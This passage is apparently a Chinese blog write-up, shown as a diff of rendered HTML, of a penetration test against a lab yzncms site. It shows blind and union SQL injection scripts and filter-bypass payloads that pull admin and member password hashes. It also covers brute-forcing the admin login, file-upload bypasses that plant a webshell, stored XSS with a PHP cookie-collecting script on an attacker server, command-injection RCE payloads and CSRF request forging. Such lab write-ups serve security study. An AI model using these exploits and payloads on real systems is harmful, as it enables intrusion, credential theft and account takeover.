+        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
+    flag = flag + <span class="hljs-built_in">chr</span>(mid)
+    print(flag)
+print(flag)
+​```
+database:yzncms
+table:yzn_admin
+columns:<span class="hljs-built_in">id</span>,username,password,roleid,encrypt
+​```</code></pre></div>
+
+<p>yzn_admin的列名，省略了后面的列</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322200732911.png" srcset="/img/loading.gif" alt="image-20210322200732911"></p>
+<p>获取管理员的用户名和密码</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>:admin
+<span class="hljs-attribute">password</span>:<span class="hljs-number">9724</span>b<span class="hljs-number">5</span>e<span class="hljs-number">6</span>c<span class="hljs-number">56</span>b<span class="hljs-number">95</span>f<span class="hljs-number">5723009</span>ef<span class="hljs-number">81961</span>bfe</code></pre></div>
+
+<p>这个密码是32位的，可能是md5处理后保存的，暂时无法破解。</p>
+<h3 id="漏洞点二"><a href="#漏洞点二" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>用户登录后，存在一个查找用户邮箱的功能，这里可能存在注入。</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181146985.png" srcset="/img/loading.gif" alt="image-20210421181146985" style="zoom:67%;">
+
+<p>这里已经提示了存在了过滤，那么就看看过滤那些东西</p>
+<p>输入一个存在的用户名，查找结果如图</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181314404.png" srcset="/img/loading.gif" alt="image-20210421181314404" style="zoom:50%;">
+
+<p>输入一个不存在的用户</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181345626.png" srcset="/img/loading.gif" alt="image-20210421181345626" style="zoom:33%;">
+
+<p>尝试输入</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">sunzy</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #</code></pre></div>
+
+<p>网页报错，并将错误信息显示，可以看到输入的or,空格都被换成了空格，这还是很容易绕过的</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421181603698.png" srcset="/img/loading.gif" alt="image-20210421181603698" style="zoom:50%;">
+
+<p>fuzz测试后，发现过滤<code>union,空格,or,and,select,from</code>，可以使用双写绕过，空格的可以使用<code>/**/</code>替换</p>
+<p>经过测试，发现返回结果只有一列</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421182546039.png" srcset="/img/loading.gif" alt="image-20210421182546039" style="zoom: 50%;">
+
+<p>直接进行sql注入</p>
+<ul>
+<li><p>获取数据库中的表名</p>
+<div class="hljs"><pre><code class="hljs gauss">sunda&#x27;<span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span><span class="hljs-built_in">group_concat</span>(table_name)<span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>infoorrmation_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-built_in">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span></code></pre></div>
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421183121965.png" srcset="/img/loading.gif" alt="image-20210421183121965" style="zoom:50%;">
+</li>
+<li><p>获取字段名</p>
+<div class="hljs"><pre><code class="hljs reasonml">sunda&#x27;<span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span>group<span class="hljs-constructor">_concat(<span class="hljs-params">column_name</span>)</span><span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>infoorrmation_schema.columns<span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&quot;yzn_member&quot;</span>#</code></pre></div>
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421183924790.png" srcset="/img/loading.gif" alt="image-20210421183924790" style="zoom:50%;">
+</li>
+<li><p>获取字段值</p>
+<div class="hljs"><pre><code class="hljs reasonml">sunda&#x27;<span class="hljs-comment">/**/</span>ununionion<span class="hljs-comment">/**/</span>selselectect<span class="hljs-comment">/**/</span>group<span class="hljs-constructor">_concat(<span class="hljs-params">passwoorrd</span>)</span><span class="hljs-comment">/**/</span>frfromom<span class="hljs-comment">/**/</span>yzn_member#</code></pre></div>
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421184126966.png" srcset="/img/loading.gif" alt="image-20210421184126966" style="zoom:67%;">
+
+</li>
+</ul>
+<h3 id="漏洞点三"><a href="#漏洞点三" class="headerlink" title="漏洞点三"></a>漏洞点三</h3><p>用户主页-&gt;积分赠送，通过测试可以发现也是存在sql注入的</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423172440793.png" srcset="/img/loading.gif" alt="image-20210423172440793" style="zoom:50%;">
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423173007408.png" srcset="/img/loading.gif" alt="image-20210423173007408" style="zoom:50%;">
+
+<p>因为没有回显，需要使用盲注</p>
+<p>盲注脚本与上面的类似，稍加修改即可。</p>
+<h3 id="漏洞点四"><a href="#漏洞点四" class="headerlink" title="漏洞点四"></a>漏洞点四</h3><p>注册后登录，发现其中存在一个投稿的功能，投稿后需要管理员审核，在此期间我们可以再次编辑我们的稿件</p>
+<p>当点击编辑后，发现url上多了一个id参数，这应该是我们稿件的id，方便查询。但是通常这种参数如果过滤不严格的话也会存在SQL注入，而这个位置显然输入数字型注入。</p>
+<div class="hljs"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">164.147</span>:<span class="hljs-number">81</span><span class="hljs-regexp">/member/</span>content/edit.html?id=<span class="hljs-number">3</span></code></pre></div>
+
+<p>探测是否 存在注入，当输入<code>?id=3 and 1=1 #</code>时页面返回正常，但是当输入<code>?id=3 and 1=2#</code>,却提示了稿件不存在，说明这里也是存在注入的，但是没有回显，无法获取返回的内容只能采用盲注的方法。</p>
+<p>==在测试的过程种发现这个位置使用 <code>&gt;</code>时会出现错误提示，而<code>&lt;</code>不起作用，只能使用<code>=</code>，所以无法使用二分注入，但是直接暴力破解也很快==</p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
+<span class="hljs-comment">#@Time : 2021/3/20 9:03</span>
+<span class="hljs-comment">#@Author : sunzy</span>
+<span class="hljs-comment">#@File : cms_sql2.py</span>
+
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+url = <span class="hljs-string">&quot;http://192.168.164.147:81/member/content/edit.html?id=&quot;</span>
+header = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;thinkphp_show_page_trace=0|0; PHPSESSID=d2b4f4b001d70e670953a36d00ca8be6; thinkphp_show_page_trace=0|0&quot;</span>&#125;
+flag = <span class="hljs-string">&quot;&quot;</span>
+words = [<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>,<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;f&quot;</span>,<span class="hljs-string">&quot;g&quot;</span>,<span class="hljs-string">&quot;h&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;j&quot;</span>,<span class="hljs-string">&quot;k&quot;</span>,<span class="hljs-string">&quot;l&quot;</span>,<span class="hljs-string">&quot;m&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>,<span class="hljs-string">&quot;o&quot;</span>,<span class="hljs-string">&quot;p&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;t&quot;</span>,<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-string">&quot;v&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>,<span class="hljs-string">&quot;B&quot;</span>,<span class="hljs-string">&quot;C&quot;</span>,<span class="hljs-string">&quot;D&quot;</span>,<span class="hljs-string">&quot;E&quot;</span>,<span class="hljs-string">&quot;F&quot;</span>,<span class="hljs-string">&quot;G&quot;</span>,<span class="hljs-string">&quot;H&quot;</span>,<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-string">&quot;J&quot;</span>,<span class="hljs-string">&quot;K&quot;</span>,<span class="hljs-string">&quot;L&quot;</span>,<span class="hljs-string">&quot;M&quot;</span>,<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-string">&quot;O&quot;</span>,<span class="hljs-string">&quot;P&quot;</span>,<span class="hljs-string">&quot;Q&quot;</span>,<span class="hljs-string">&quot;R&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>,<span class="hljs-string">&quot;T&quot;</span>,<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-string">&quot;V&quot;</span>,<span class="hljs-string">&quot;W&quot;</span>,<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;Y&quot;</span>,<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>,<span class="hljs-string">&quot;5&quot;</span>,<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;9&quot;</span>]
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>():</span>
+    flag = <span class="hljs-string">&#x27;&#x27;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
+        <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> words:
+            <span class="hljs-comment"># payload = &quot;3 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a = &#123;1&#125;)#&quot;.format(i,ord(word))</span>
+            payload = <span class="hljs-string">&quot;3 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;yzn_admin&#x27; having a=&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">ord</span>(word))
+            payload = <span class="hljs-string">&quot;3 and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from yzn_admin having a=&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">ord</span>(word))
+            url1 = url+payload
+
+            res = requests.get(url1,headers=header)
+            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;立即提交&quot;</span> <span class="hljs-keyword">in</span> res.text:
+                flag += word
+                <span class="hljs-keyword">break</span>
+        print(flag)
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    dump()</code></pre></div>
+
+<p>成功获取到数据库名，漏洞利用成功。</p>
+<h2 id="6-暴力破解"><a href="#6-暴力破解" class="headerlink" title="6.暴力破解"></a>6.暴力破解</h2><p>该漏洞是由于管理员或者用户使用了常用的简单密码，攻击者可以通过暴力破解的方式获取用户名和密码，前面的sql注入我们可以知道管理员账号为admin,但是密码为加盐后的md5值，我们无法破解，只能尝试使用暴力破解。</p>
+<p>在文件上传漏洞点一中我们发现了admin模块就在路径为<code>\application\admin</code>，所以管理员后台url应该为<code>http://192.168.164.147/admin</code></p>
+<p>当然这里也可以根据经验猜测后台登录路径。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323144704682.png" srcset="/img/loading.gif" alt="image-20210323144704682"></p>
+<p>访问后台</p>
+<p>查看源码可以发现，登录是需要token的，但是还是可以使用bp自带的模块破解，不过需要麻烦一点。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406191847633.png" srcset="/img/loading.gif" alt="image-20210406191847633"></p>
+<ul>
+<li><p>使用bp抓包，将数据包发送到<code>Intruder</code>模块，然后加上参数，选择<code>Pitchfork</code>模式</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192132707.png" srcset="/img/loading.gif" alt="image-20210406192132707" style="zoom:67%;">
+</li>
+<li><p>到option页面，不可以多线程</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192222031.png" srcset="/img/loading.gif" alt="image-20210406192222031" style="zoom:67%;">
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192611191.png" srcset="/img/loading.gif" alt="image-20210406192611191" style="zoom:67%;">
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192635613.png" srcset="/img/loading.gif" alt="image-20210406192635613"></p>
+</li>
+<li><p>设置payload1,也就是token值</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192820026.png" srcset="/img/loading.gif" alt="image-20210406192820026"></p>
+</li>
+<li><p>设置payload2 password的值，这里可以选择自己收藏的密码字典，或者直接使用bp自带的。</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406193125862.png" srcset="/img/loading.gif" alt="image-20210406193125862" style="zoom:67%;">
+
+</li>
+</ul>
+<p>爆破结果</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406193217954.png" srcset="/img/loading.gif" alt="image-20210406193217954" style="zoom: 67%;">
+
+<p>当密码为admin时，可以看到相应包中返回的数据存在一个url，很明显这里是，登录成功后进行的跳转，可以在浏览器中看到，已经登录到了后台页面</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406193418062.png" srcset="/img/loading.gif" alt="image-20210406193418062" style="zoom:67%;">
+
+
+
+
+
+<p>结合前面sql注入获取的密码和encrypt，尝试猜测密码的保存方式</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">md5</span>(&#x27;adminWo<span class="hljs-number">0</span>bAa&#x27;) = <span class="hljs-number">9724</span>b<span class="hljs-number">5</span>e<span class="hljs-number">6</span>c<span class="hljs-number">56</span>b<span class="hljs-number">95</span>f<span class="hljs-number">5723009</span>ef<span class="hljs-number">81961</span>bfe</code></pre></div>
+
+<p>所以密码保存的是密码和加密因子拼接后的md5值。</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323150840468.png" srcset="/img/loading.gif" alt="image-20210323150840468" style="zoom:67%;">
+
+<h2 id="7-文件上传（3个）"><a href="#7-文件上传（3个）" class="headerlink" title="7.文件上传（3个）"></a>7.文件上传（3个）</h2><h3 id="漏洞点一-1"><a href="#漏洞点一-1" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>用户登录后可以看到一个图片征集页面<code>http://192.168.164.147/member/index/photo</code></p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220533116.png" srcset="/img/loading.gif" alt="image-20210420220533116"></p>
+<p>随便上传一个图片文件后，可以看到返回了图片的保存地址</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220615042.png" srcset="/img/loading.gif" alt="image-20210420220615042"></p>
+<p>但是当上传一个非图片类型时，会提示只允许上传<code>.jpg|.png|.gif</code></p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220733976.png" srcset="/img/loading.gif" alt="image-20210420220733976"></p>
+<p>这只是前端检测，抓包就可以解决</p>
+<p>抓包上传一个php为后缀的文件，并将MIME改为<code>image/jpeg</code>,可以看到php后缀被换成空了</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220956393.png" srcset="/img/loading.gif" alt="image-20210420220956393"></p>
+<p>尝试双写绕过，可以看到文件已经正常上传</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420221049529.png" srcset="/img/loading.gif" alt="image-20210420221049529"></p>
+<p>访问可以看到phpinfo<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420221137498.png" srcset="/img/loading.gif" alt="image-20210420221137498" style="zoom:50%;"></p>
+<p>下面就是上传一句话木马，控制服务器</p>
+<h3 id="漏洞点二-1"><a href="#漏洞点二-1" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>用户登录后可以在内容管理—&gt;在线投稿的位置投稿，这里用户可以上传稿件中需要用到图片</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406154414604.png" srcset="/img/loading.gif" alt="image-20210406154414604" style="zoom: 50%;">
+
+<p>但是攻击者可能会上传一些刻意文件，比如一句话木马，来攻击服务器，下面我们上传一个php文件获取<code>phpinfo</code></p>
+<p>首先选择一张空的照片，然后将其改为php文件，内容为<code>&lt;? phpinfo(); ?&gt;</code>，可以看到上传成功的url</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406160155045.png" srcset="/img/loading.gif" alt="image-20210406160155045"></p>
+<p>访问服务器返回的url，已经看到该网站的phpinfo信息，也就是确定了该上传目录拥有可执行权限，下一步就是上传一句话木马进一步控制该服务器。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406160256835.png" srcset="/img/loading.gif" alt="image-20210406160256835"></p>
+<p>上传一句话木马</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406160534542.png" srcset="/img/loading.gif" alt="image-20210406160534542"></p>
+<p>使用蚁剑连接即可。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322205328527.png" srcset="/img/loading.gif" alt="image-20210322205328527"></p>
+<h3 id="漏洞点三-1"><a href="#漏洞点三-1" class="headerlink" title="漏洞点三"></a>漏洞点三</h3><p>在上一步中我们已经知道了admin的账号密码，然后登录。再用自己注册的账号向某个栏目投稿，之后管理员再审核，便会出现一个类似于用户投稿的页面，然后就可以像上一个漏洞一样上传一句话木马文件。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406161255195.png" srcset="/img/loading.gif" alt="image-20210406161255195"></p>
+<h2 id="8-XSS（2个）"><a href="#8-XSS（2个）" class="headerlink" title="8.XSS（2个）"></a>8.XSS（2个）</h2><h3 id="漏洞点一-2"><a href="#漏洞点一-2" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>登录管理员账号后可以发送短消息给用户</p>
+<p>在之前的sql注入漏洞里，我们可以获取<code>yzn_member</code>表中的所有信息，虽然可以获取密码，但是因为是md5值，并且是加盐后的md5值，破解的难度很高，所以可以使用获取cookie的方式攻击。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322212238672.png" srcset="/img/loading.gif" alt="image-20210322212238672" style="zoom:67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322212821313.png" srcset="/img/loading.gif" alt="image-20210322212821313" style="zoom: 67%;"></p>
+<p>从中可以看到用户登录的时间，从而可以判断该用户是否在线，我们选择那些在线的用户，获取其浏览器的cookie，这样就可以做到密码登录其账号。</p>
+<p>尝试向用户<code>szy</code>发送带有恶意脚本的短消息，内容如下</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323151141271.png" srcset="/img/loading.gif" alt="image-20210323151141271"></p>
+<p>发送完后，浏览器弹出<code>xss</code>，并且每次刷新都会出现弹窗，说明是存储型XSS。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323151240397.png" srcset="/img/loading.gif" alt="image-20210323151240397"></p>
+<p>当用户点开收件箱时，浏览器也会出现弹窗，说明漏洞利用成</p>
+<p>==尝试获取用户cookie(失败)==</p>
+<p>首先在服务器上写一个获取cookie的脚本，内容如下，就是获取cookie参数，然后将其写入cookie.txt中，并记录写入的时间。</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];
+<span class="hljs-variable">$ip</span> = getenv (<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>);
+<span class="hljs-variable">$time</span> = date(<span class="hljs-string">&#x27;Y-m-d g:i:s&#x27;</span>);
+<span class="hljs-variable">$fp</span> = fopen(<span class="hljs-string">&quot;cookie.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);
+fwrite(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&quot;IP: &quot;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&quot;Date: &quot;</span>.<span class="hljs-variable">$time</span>.<span class="hljs-string">&quot; Cookie:&quot;</span>.<span class="hljs-variable">$cookie</span>.<span class="hljs-string">&quot;\n&quot;</span>);
+fclose(<span class="hljs-variable">$fp</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>然后向用户发送带有恶意脚本的消息，<code>192.168.164.1</code>为服务器的ip地址，这里就使用了自己的本机地址，而在现实的渗透测试中是需要选择能够与公网通信的服务器或者vps。</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323153154260.png" srcset="/img/loading.gif" alt="image-20210323153154260" style="zoom:67%;">
+
+<p>当用户点开收件箱后，这个脚本就会自动执行，就可以将cookie写入到服务器上的cookie.txt。</p>
+<p>查看cookie.txt 获取的cookie</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323153009193.png" srcset="/img/loading.gif" alt="image-20210323153009193"></p>
+<p>但是可以发现这里的cookie好像并不完整，看了一下原来是PHPsession值那里设置了http-only，而http-only就是防止通过js脚本读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容。</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408154117932.png" srcset="/img/loading.gif" alt="image-20210408154117932" style="zoom:67%;">
+
+<h3 id="漏洞点二-2"><a href="#漏洞点二-2" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>登录后的用户可以在留言板进行留言，留言后会显示近期的留言信息</p>
+<p>url <a target="_blank" rel="noopener" href="http://192.168.164.147/member/index/comment.html">http://192.168.164.147/member/index/comment.html</a></p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223132548.png" srcset="/img/loading.gif" alt="image-20210419223132548"></p>
+<p>在留言中插入恶意脚本，此时数据会被提交到服务器处理，并写入数据库，显示近期的留言，此时恶意脚本被执行，造成了XSS漏洞</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223319706.png" srcset="/img/loading.gif" alt="image-20210419223319706"></p>
+<p>可以看大恶意脚本被浏览器执行，嵌入到html页面中</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223406331.png" srcset="/img/loading.gif" alt="image-20210419223406331" style="zoom: 67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223500074.png" srcset="/img/loading.gif" alt="image-20210419223500074" style="zoom:67%;"></p>
+<h2 id="9-RCE（2个）"><a href="#9-RCE（2个）" class="headerlink" title="9.RCE（2个）"></a>9.RCE（2个）</h2><h3 id="漏洞点一-3"><a href="#漏洞点一-3" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>后台管理中存在一个采集模块，其中存在于一个“phpinfo”，点击即可查看到phpinfo信息</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413165611927.png" srcset="/img/loading.gif" alt="image-20210413165611927"></p>
+<p>这里看似没有提交参数位置，让人觉得无从下手，在前端查看源码即可发现，是将输入框隐藏了，才无法看见，输入的内容。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413170143896.png" srcset="/img/loading.gif" alt="image-20210413170143896"></p>
+<p>抓包就可以发现端倪，可以看到这里存在一个post方式提交了一个data参数</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413165919019.png" srcset="/img/loading.gif" alt="image-20210413165919019"></p>
+<p>提交的内容为</p>
+<div class="hljs"><pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">data</span>=phpinfo()</span></code></pre></div>
+
+<p>然后就返回了php的各项信息，应该是执行了phpinfo这个函数，那么可能就是用到了eval()函数，尝试输入</p>
+<div class="hljs"><pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">data</span>=system(&#x27;<span class="hljs-title">ls</span> /&#x27;)</span></code></pre></div>
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413170755721.png" srcset="/img/loading.gif" alt="image-20210413170755721" style="zoom:67%;">
+
+<p>利用成功。</p>
+<h3 id="漏洞点二-3"><a href="#漏洞点二-3" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>后台管理中存在一个采集模块，其中存在于一个“查看内网主机”，可以查看内网中的主机是否在线。查看一个主机是否在线最常用的方法就是使用<code>ping</code>命令，还要结合php中的<code>shell_exec()</code>函数。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323155906491.png" srcset="/img/loading.gif" alt="image-20210323155906491"></p>
+<p>尝试使用管道符拼接命令，造成命令执行。</p>
+<p>payload:</p>
+<div class="hljs"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> | ls /</code></pre></div>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413171011227.png" srcset="/img/loading.gif" alt="image-20210413171011227"></p>
+<p>可以看到列出了根目录的文件夹，说明命令执行成功。</p>
+<h2 id="10-CSRF（4个）"><a href="#10-CSRF（4个）" class="headerlink" title="10.CSRF（4个）"></a>10.CSRF（4个）</h2><h3 id="漏洞点一-4"><a href="#漏洞点一-4" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>用户主页面–&gt;积分赠送</p>
+<p>输入用户名和要赠送积分的数量即可赠送自己的积分</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423171711582.png" srcset="/img/loading.gif" alt="image-20210423171711582" style="zoom:50%;">
+
+<p>当我们通过查找用户邮箱功能获取到某个用户的邮箱时，就可以构造出一个类似于下图的网页，生成链接后通过邮箱发给受害者然后诱使其点击链接，就能神不知鬼不觉的将其积分转到自己的账号下</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423170700922.png" srcset="/img/loading.gif" alt="image-20210423170700922" style="zoom:50%;">
+
+
+
+
+
+<h3 id="漏洞点二-4"><a href="#漏洞点二-4" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>后台管理中，存在会员管理模块–&gt;点击编辑，在这里管理员可以改变会员的等级，积分和密码等。然而如果攻击者获取了更改用户等级的表单就可以精心构造出一个网页（burp可以一键生成），这个网页的功能可以将会员修改为攻击者想要的等级，或者是添加管理员。此时如果管理员不小心点击了这个链接，浏览器带着管理员登录时的<code>cookie</code>访问了该链接，那么服务器就认为修改会员等级的操作是管理员本人，执行该操作，从而造成攻击。</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408153533206.png" srcset="/img/loading.gif" alt="image-20210408153533206" style="zoom: 50%;">
+
+<p>使用bp抓取该表单</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323162252486.png" srcset="/img/loading.gif" alt="image-20210323162252486" style="zoom: 50%;">
+
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=szy&amp;nickname=szy&amp;mobile=<span class="hljs-number">17856276754</span>&amp;email=<span class="hljs-number">263233</span>%<span class="hljs-number">40</span>qq.com&amp;password=&amp;groupid=<span class="hljs-number">2</span>&amp;point=<span class="hljs-number">0</span>&amp;vip=<span class="hljs-number">0</span>&amp;overduedate=<span class="hljs-number">1970</span>-<span class="hljs-number">01</span>-<span class="hljs-number">01</span>+<span class="hljs-number">08</span>%<span class="hljs-number">3</span>A<span class="hljs-number">00</span>%<span class="hljs-number">3</span>A<span class="hljs-number">00</span>&amp;id=<span class="hljs-number">1</span></code></pre></div>
+
+<p>提交的数据中可以修改<code>groupid, point, vip</code></p>
+<p>使用bp一键生成攻击网页</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323162450984.png" srcset="/img/loading.gif" alt="image-20210323162450984"></p>
+<p>生成的内容为</p>
+<div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
